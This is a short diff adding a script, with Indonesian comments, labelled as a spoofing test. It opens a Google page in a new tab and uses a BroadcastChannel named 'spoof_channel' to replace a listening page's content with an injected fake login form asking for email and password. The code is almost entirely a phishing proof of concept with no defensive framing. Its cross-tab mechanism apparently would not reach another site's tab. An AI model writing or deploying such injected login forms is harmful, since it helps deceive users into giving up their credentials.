@@ -1,0 +1,20 @@
+<script>
+const channel = new BroadcastChannel('spoof_channel');
+
+channel.onmessage = (e) => {
+  if (e.data.type === 'inject') {
+    document.body.innerHTML = e.data.content;
+  }
+};
+
+// Buka tab spoofed
+window.open("https://www.google.com/csi", "_blank");
+
+// Kirim konten ke tab lain
+setTimeout(() => {
+  channel.postMessage({
+    type: 'inject',
+    content: '<h1>Login Form Injected</h1><input type="text" placeholder="Email"><input type="password" placeholder="Password">'
+  });
+}, 2000);
+</script>
